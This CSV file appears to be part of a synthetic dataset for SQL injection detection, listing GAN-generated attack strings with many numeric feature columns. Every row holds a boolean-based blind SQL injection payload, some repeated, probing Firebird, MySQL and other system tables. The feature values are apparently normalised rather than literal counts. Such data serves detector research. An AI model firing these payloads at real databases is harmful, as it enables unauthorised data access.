id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000448,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,5.792888609003724,120.88341522216797,77.96591186523438,13.615681648254395,42.23080062866211,-0.31591886281967163,62.569759368896484,13.379098892211914,0.9108794927597046,0.4718928039073944,0.020393362268805504,0.24395571649074554,0.12969860434532166,4.339193344116211,2.3310911655426025,0.5505391359329224,-0.21234220266342163,-0.05186988413333893,0.25744354724884033,0.05244927853345871,3.3121581077575684,2.8044567108154297,1.988840937614441,0.47611328959465027,1.83259916305542,0.9178048372268677,0.5686888694763184,0.5056690573692322,0.2860553562641144,1.1782407760620117,-0.033141668885946274,-0.15210412442684174,0.23979127407073975,1.2225981950759888,0.5494734644889832,1.7216774225234985,1.271186351776123,0.8852404952049255,0.5417529940605164,0.5089091062545776,0.461819052696228,0.532342255115509,-0.009220397099852562,-0.5032891035079956,0.2989428639411926,0.25478747487068176,0.8923947215080261,0.10934419929981232,0.1616932451725006,-0.24060609936714172,0.13278944790363312,-0.010503584519028664,-0.1556970179080963,0.48520606756210327,-0.6248010396957397,-0.46635887026786804,0.2851434648036957,0.7405337691307068,0.5024831295013428,0.17432919144630432,0.11961989104747772,-1.1830062866210938,0.3742212951183319,0.21453772485256195,0.300716757774353,-0.4162411689758301,0.4035327434539795,0.7865192890167236,-0.40215086936950684,0.4093994200229645,-0.4256350100040436,-0.21168935298919678,-0.07197253406047821,0.18408606946468353,0.1252780556678772,0.1868552416563034,1.0827205181121826,0.37373092770576477,0.029864512383937836,-0.19483131170272827,0.7913617491722107,3.3725438117980957,0.39563679695129395,0.2960933446884155,-0.5448096394538879,-0.36390551924705505,0.5436491966247559,-0.5596296191215515,1.0787690877914429
GAN_000449,attack,boolean,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000028,6.441406938570928,114.88513946533203,65.9367446899414,13.414520263671875,47.187889099121094,0.008435666561126709,48.085975646972656,13.664278984069824,0.6084265112876892,0.4491729438304901,0.03349239006638527,0.2943551242351532,0.14519533514976501,4.081920623779297,1.5565146207809448,0.4869823753833771,0.2888004183769226,-0.007703098468482494,0.2825082838535309,0.03132613003253937,3.5257039070129395,3.9057183265686035,1.3622368574142456,0.8157904744148254,2.0107836723327637,0.8935508728027344,0.8458818197250366,1.0382660627365112,0.21952582895755768,1.0666145086288452,-0.023099981248378754,-0.531317949295044,0.22419585287570953,0.9800588488578796,0.6362206935882568,1.6481273174285889,2.10707950592041,0.8218487501144409,0.3483925759792328,0.5750529170036316,0.46653321385383606,0.33711355924606323,0.5453565716743469,-0.6310907602310181,0.12712669372558594,0.034084782004356384,0.6266742944717407,0.23663680255413055,0.32368189096450806,-0.16182294487953186,0.1482638567686081,0.06388137489557266,0.016322102397680283,0.8570668697357178,-0.6528584957122803,-0.6836342811584473,0.3864953815937042,0.5930014252662659,0.234040305018425,-0.21768638491630554,0.42889779806137085,-0.9574904441833496,0.8233134746551514,0.2855105698108673,0.2597947120666504,-0.5537651181221008,0.6115472912788391,0.7663822174072266,-0.47449398040771484,0.26743173599243164,-0.2514880895614624,0.2816286087036133,-0.16843809187412262,0.22946739196777344,0.09841987490653992,0.2302609384059906,1.242578387260437,0.22030164301395416,-0.08217732608318329,-0.04230019450187683,0.9840002655982971,3.152581214904785,0.1500089168548584,0.7220672369003296,-0.7187018394470215,-0.7492631077766418,0.7575328946113586,-0.0776381641626358,0.67774498462677
GAN_000450,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000048,6.620986520662013,110.76602172851562,64.00761413574219,13.050910949707031,42.2025260925293,-0.1298370659351349,53.287437438964844,13.95805549621582,0.5956743359565735,0.4369243383407593,0.03687656298279762,0.2972959876060486,0.14928564429283142,4.163344383239746,1.6993622779846191,0.31983649730682373,0.25687938928604126,-0.02013976499438286,0.31124573945999146,0.06354958564043045,3.7210144996643066,3.0338175296783447,1.6208797693252563,0.6679840683937073,2.0517325401306152,0.6111626625061035,1.029167652130127,0.5956320762634277,0.28703343868255615,1.0300421714782715,-0.033934030681848526,-0.6282579898834229,0.2937040627002716,1.053984522819519,0.5651789307594299,1.6756558418273926,1.8886768817901611,1.205971598625183,0.21557791531085968,0.7625988721847534,0.4535369277000427,0.411193311214447,0.10667967796325684,-0.7075897455215454,0.1994859278202057,-0.09725355356931686,0.8140760064125061,0.17322564125061035,0.23601330816745758,-0.20921269059181213,0.1092023104429245,-0.007424543146044016,0.045362669974565506,0.9680495858192444,-0.7656531929969788,-0.8218780755996704,0.35895243287086487,0.7339666485786438,0.08320803195238113,-0.03812170401215553,0.3228815197944641,-1.368309736251831,0.7944518327713013,0.3087570369243622,0.27389079332351685,-0.304424524307251,0.6216529607772827,0.9874758720397949,-0.5909228324890137,0.3305612802505493,-0.19622303545475006,0.1962994933128357,-0.23624630272388458,0.21186786890029907,0.10188319534063339,0.4203857183456421,1.2273622751235962,0.40284809470176697,0.11844123154878616,-0.1212262213230133,0.8812463879585266,2.876559019088745,0.24871814250946045,0.5340529680252075,-0.46685704588890076,-0.9766625761985779,0.9339125752449036,-0.4063709080219269,0.6139401793479919
GAN_000451,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,5.737184258000862,103.63673400878906,43.700870513916016,14.429749488830566,46.917720794677734,0.08715839684009552,32.157588958740234,15.23517894744873,0.6841870546340942,0.3941483497619629,0.10941015928983688,0.3579738140106201,0.16720622777938843,3.958657741546631,0.5560427904129028,0.014346239157021046,1.0761560201644897,0.028220124542713165,0.1885695904493332,0.02588101662695408,3.335620403289795,4.231776237487793,0.7696436643600464,0.536773145198822,2.0333423614501953,0.47042471170425415,0.7935488224029541,0.818774938583374,0.11945053935050964,0.49575984477996826,0.004457381553947926,-0.28652361035346985,0.19995816051959991,0.18015553057193756,0.6208919882774353,1.6629867553710938,2.668407917022705,1.1001687049865723,0.16121502220630646,0.5329069495201111,0.38333165645599365,0.28188782930374146,0.27828750014305115,-0.45379164814949036,0.20879732072353363,-0.028021644800901413,0.6981696486473083,0.1515912413597107,0.22518907487392426,-0.0663008913397789,0.04240134730935097,0.026327265426516533,0.1420600563287735,0.9491622447967529,-0.28098922967910767,-0.7673245668411255,0.51295006275177,0.3570527136325836,-0.38259249925613403,-0.3794666826725006,0.4576109051704407,-0.9122171401977539,0.9711027145385742,0.24031881988048553,0.17017778754234314,-0.2450825721025467,0.7001844048500061,0.6832641363143921,-0.35066142678260803,-0.003938276320695877,-0.11198346316814423,0.0719926506280899,-0.28127697110176086,0.10853434354066849,0.01155175268650055,0.7885502576828003,1.2225403785705566,0.43034958839416504,-0.2889886796474457,0.15525463223457336,0.5277341604232788,2.7456724643707275,0.6176333427429199,0.8705009818077087,-0.24920248985290527,-0.915895938873291,1.0143853425979614,-0.049838434904813766,0.032342083752155304
GAN_000452,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,4.798022293289622,95.3895492553711,23.53532600402832,14.53570556640625,42.52104949951172,0.10574895143508911,14.542526245117188,14.5122709274292,0.8282071352005005,0.3214893341064453,0.122273288667202,0.37435996532440186,0.17744317650794983,3.8481943607330322,0.8910874128341675,-0.08862936496734619,1.1083837747573853,0.034287773072719574,0.2592400312423706,0.016982194036245346,2.885410785675049,3.671950578689575,0.6867039799690247,0.5241144895553589,2.097691059112549,0.24757984280586243,0.7240414619445801,0.4349077641963959,0.2272447943687439,0.3351347744464874,-0.000928583147469908,-0.2998632490634918,0.25153180956840515,-0.059910956770181656,0.619028627872467,1.8182568550109863,2.283045530319214,1.1957027912139893,0.06203194335103035,0.6931576728820801,0.26479968428611755,0.15546201169490814,-0.003632030915468931,-0.31295016407966614,0.026470161974430084,-0.16491152346134186,0.6105513572692871,0.06133008375763893,0.17588256299495697,-0.08498092740774155,-0.011054018512368202,-0.07847438007593155,0.1451137363910675,0.9601314663887024,-0.616888165473938,-0.7851135730743408,0.37497615814208984,0.27753520011901855,-0.565375566482544,-0.3103829622268677,0.19332407414913177,-0.6120137572288513,0.758441686630249,0.1806298792362213,-0.0033140257000923157,-0.19124643504619598,0.5216111540794373,0.5576449036598206,-0.7538301944732666,0.197035551071167,0.08553148061037064,0.05164587125182152,-0.3925890326499939,0.047557979822158813,0.15776368975639343,0.8709018230438232,1.1582111120224,0.6797551512718201,-0.04573410749435425,0.24893073737621307,0.40800008177757263,2.678379774093628,0.9071384072303772,0.3813430368900299,-0.3518229126930237,-0.7541449069976807,0.9068113565444946,-0.21397176384925842,-0.09475210309028625
GAN_000453,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,8.329651710297389,125.26722717285156,103.82264709472656,10.821857452392578,41.52592849731445,-0.5298623442649841,91.99253845214844,12.018072128295898,0.2643333673477173,0.5905945897102356,-0.04749467596411705,0.19703078269958496,0.11566753685474396,4.623438358306885,2.07100772857666,-0.2745950222015381,-0.39656299352645874,-0.05754171311855316,0.3514595627784729,0.11274071037769318,3.476731538772583,2.7989015579223633,2.6145896911621094,0.6635549068450928,2.1201064586639404,1.1993721723556519,0.960579514503479,0.754188597202301,0.41997599601745605,1.7119944095611572,-0.04152918979525566,-0.7465212941169739,0.3685154318809509,1.6641151905059814,0.613910973072052,1.475022792816162,0.6657975316047668,0.5439123511314392,0.4920158088207245,0.9505618810653687,0.55069500207901,0.8703146576881409,0.07632850855588913,-1.0197861194610596,0.40374335646629333,0.3276923596858978,0.9952044486999512,0.17964981496334076,0.30414238572120667,-0.27823606133461,0.18644769489765167,0.013503989204764366,0.048650939017534256,1.2264044284820557,-0.8281987905502319,-0.5943604707717896,0.6023666262626648,0.796127438545227,0.8283566236495972,0.16691190004348755,0.18487419188022614,-1.555789828300476,1.2124489545822144,0.26559919118881226,0.5750388503074646,-0.8504647016525269,0.9552876353263855,1.6960248947143555,-0.4438215494155884,0.7197611331939697,-0.7361821532249451,-0.03024410456418991,-0.08378702402114868,0.26404815912246704,0.030334103852510452,0.27519887685775757,1.3080668449401855,0.1542655974626541,0.13696923851966858,-0.5036880970001221,0.9690414667129517,3.3828485012054443,0.0330045223236084,0.8488587737083435,-0.6767059564590454,-0.8219877481460571,1.241049885749817,-0.05026377737522125,1.3081918954849243
GAN_000454,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000048,6.131361050365801,115.43423461914062,65.75883483886719,12.04688549041748,43.367774963378906,-0.10806112736463547,50.77140426635742,12.892926216125488,0.598550021648407,0.44530025124549866,0.028409985825419426,0.26757195591926575,0.14090360701084137,4.270157814025879,1.9452741146087646,0.3059746026992798,0.1354367733001709,-0.0012826259480789304,0.3051794171333313,0.056967537850141525,3.3050713539123535,3.1686513423919678,1.586350440979004,0.5372042059898376,2.0248682498931885,0.6798767447471619,0.8490281105041504,0.5507543683052063,0.28575801849365234,1.1250957250595093,-0.020759867504239082,-0.3929726779460907,0.2738056182861328,0.9281780123710632,0.6102665662765503,1.62647545337677,1.5557401180267334,0.8239008784294128,0.35957375168800354,0.7715740203857422,0.3911169767379761,0.42618459463119507,0.16718722879886627,-0.6605608463287354,0.22180938720703125,0.0799613744020462,0.6328073740005493,0.12340380996465683,0.20279712975025177,-0.18107184767723083,0.11419203877449036,-0.025759989395737648,0.017741229385137558,0.921952486038208,-0.7865673899650574,-0.7483867406845093,0.6117860078811646,0.37932294607162476,0.19227786362171173,-0.16382306814193726,0.14892882108688354,-1.0848388671875,0.829258918762207,0.24479468166828156,0.33087605237960815,-0.4800981879234314,0.6741348505020142,1.034281849861145,-0.5399981141090393,0.5085049271583557,-0.33674490451812744,0.15631839632987976,-0.17740100622177124,0.16576962172985077,0.10989797860383987,0.26880544424057007,1.1220165491104126,0.40124452114105225,0.021996144205331802,-0.1713516116142273,0.7906098961830139,3.275865316390991,0.5791860818862915,0.6893080472946167,-0.6683836579322815,-0.6394726634025574,1.0134243965148926,-0.16305102407932281,0.6731498837471008
GAN_000455,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,6.506206597380153,123.15166473388672,79.63301849365234,13.05167007446289,45.32872772216797,-0.33869805932044983,64.20829010009766,13.108165740966797,0.6668353080749512,0.5076149106025696,0.014216375537216663,0.2508338689804077,0.13454656302928925,4.348927974700928,2.3648362159729004,0.40677714347839355,-0.178195059299469,-0.04544847086071968,0.2782028019428253,0.04907825589179993,3.653953790664673,3.223097801208496,2.1651177406311035,0.6549992561340332,1.9357459545135498,0.9139628410339355,0.7260255813598633,0.705504298210144,0.3482252359390259,1.249896764755249,-0.04687311872839928,-0.5058013200759888,0.24179057776927948,1.2488802671432495,0.6252015233039856,1.6368978023529053,1.5283015966415405,0.9041134715080261,0.47911709547042847,0.5971389412879944,0.5200439095497131,0.4487614035606384,0.0941973328590393,-0.8539503812789917,0.1698552966117859,0.06438113749027252,0.946846067905426,0.16407091915607452,0.2657468318939209,-0.1965307593345642,0.16490162909030914,0.06546279042959213,-0.12022539973258972,0.7493783235549927,-0.7049518823623657,-0.5669142007827759,0.4513229429721832,0.6354414820671082,0.5677330493927002,0.11277978867292404,-0.007555704563856125,-1.1758968830108643,0.6310700178146362,0.27927353978157043,0.44138598442077637,-0.4571295976638794,0.5895062685012817,0.9657638072967529,-0.37783879041671753,0.4115453362464905,-0.3819447159767151,-0.014505356550216675,-0.09416818618774414,0.23138289153575897,0.10413164645433426,0.13102656602859497,1.147061824798584,0.22758322954177856,0.13106392323970795,-0.20685076713562012,0.7868585586547852,3.401144504547119,0.09633445739746094,0.5667212605476379,-0.5913323760032654,-0.7078045010566711,0.6437999606132507,-0.40430670976638794,1.0128450393676758
GAN_000456,attack,boolean,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000028,6.098220487402723,118.75914001464844,68.6489028930664,13.039457321166992,49.18400192260742,-0.16265490651130676,51.31292724609375,13.657937049865723,0.6732097864151001,0.46264326572418213,0.0370318703353405,0.28088629245758057,0.14261338114738464,4.093437194824219,2.0151047706604004,-0.008003952912986279,0.2801614999771118,-0.01696150004863739,0.3132781684398651,0.03485250473022461,3.572153091430664,3.7293267250061035,1.5686705112457275,0.8962292671203613,1.9857113361358643,0.7186521887779236,0.5621660947799683,0.9544811248779297,0.19249051809310913,1.0056301355361938,-0.01489170640707016,-0.36149799823760986,0.2316223382949829,0.8985609412193298,0.6504587531089783,1.6274945735931396,2.1664719581604004,0.8326180577278137,0.424405962228775,0.45882612466812134,0.4749281406402588,0.4368531405925751,0.2439754456281662,-0.7257707118988037,0.3169901967048645,0.2072768360376358,0.47738489508628845,0.22397512197494507,0.2800996005535126,-0.07373758405447006,0.2007056325674057,0.05688004195690155,0.1002901941537857,0.9957093596458435,-0.5511166453361511,-0.6836013793945312,0.3476892113685608,0.5514962077140808,0.3662758767604828,-0.08086545765399933,0.39356088638305664,-0.7449905276298523,0.7250650525093079,0.2242312729358673,0.31389284133911133,-0.6422434449195862,0.4391056299209595,0.8475521802902222,-0.5148816108703613,0.3747307062149048,-0.33571550250053406,0.21582283079624176,0.0028522908687591553,0.18879659473896027,0.08461832255125046,0.28360265493392944,1.15972900390625,0.22142022848129272,-0.17056718468666077,-0.027057647705078125,0.7103029489517212,3.6694138050079346,0.3179861307144165,0.7991520166397095,-0.7136194109916687,-0.6411300301551819,0.8241777420043945,-0.07110528647899628,0.7995392084121704
GAN_000457,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,5.201314049146986,109.09026336669922,44.67163848876953,13.505346298217773,40.53438949584961,-0.007899604737758636,33.43389892578125,14.820734977722168,0.9144620895385742,0.366583913564682,0.11535480618476868,0.3182135820388794,0.168783038854599,4.039085388183594,1.5701745748519897,0.3580223321914673,0.5429443120956421,-0.01093995664268732,0.27073854207992554,0.0426730178296566,2.7111144065856934,2.505429744720459,1.6156575679779053,0.547550618648529,1.8155568838119507,0.3546020984649658,0.7804851531982422,0.3372917175292969,0.22298741340637207,0.6596817374229431,-0.015811098739504814,-0.19812987744808197,0.2476998269557953,0.19956587255001068,0.4720688462257385,1.7569524049758911,1.8684651851654053,1.2927424907684326,0.3127705156803131,0.44174766540527344,0.32308146357536316,0.3974153995513916,-0.027336958795785904,-0.5851526260375977,-0.018729254603385925,-0.04284874349832535,0.6828306913375854,0.11191702634096146,0.14432160556316376,-0.09239434450864792,0.05960768833756447,-0.06398453563451767,-0.1681634783744812,0.9518782496452332,-0.6196520924568176,-0.6414012908935547,0.3824041485786438,0.2569409906864166,-0.14746245741844177,-0.03129968047142029,0.05242826044559479,-0.8925192356109619,0.43168047070503235,0.16203321516513824,0.27565544843673706,-0.033137522637844086,0.4595458507537842,0.9974132776260376,-0.5809423327445984,0.23062773048877716,-0.16907717287540436,-0.06607131659984589,-0.47826582193374634,0.13019947707653046,0.01882065087556839,0.3971713185310364,1.1414284706115723,0.6220624446868896,-0.10522934049367905,0.0065298378467559814,0.29974329471588135,2.4755284786224365,0.9786123633384705,0.33290889859199524,-0.2640635669231415,-0.4019346237182617,0.56251060962677,-0.47840380668640137,0.09899584203958511
